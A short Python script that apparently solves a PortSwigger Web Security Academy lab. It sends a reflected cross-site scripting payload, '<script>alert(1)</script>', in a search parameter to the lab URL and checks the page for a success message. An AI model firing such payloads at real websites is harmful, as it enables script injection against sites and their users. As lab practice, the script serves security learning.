import requests
import re
lab_url = "https://0a0f00890429f0c6807c03ab002a00df.web-security-academy.net/"
xss_payload = "<script>alert(1)</script>"
query_parameters ={
    "search": xss_payload
}

print(f"[*] Sending xss exploit payload to portswigger lab")
patterns = re.search('Congratulations','Congratulations')

try:
    response=requests.get(lab_url, params=query_parameters , timeout=10)
    lab_solved=re.search('Congratulations',response.text)
    if lab_solved:
        print(response.text[lab_solved.start(): lab_solved.end()])
        print("Congratulations you solved the lab !")

except:
    print(f"[*]Network error ! Could not connect")


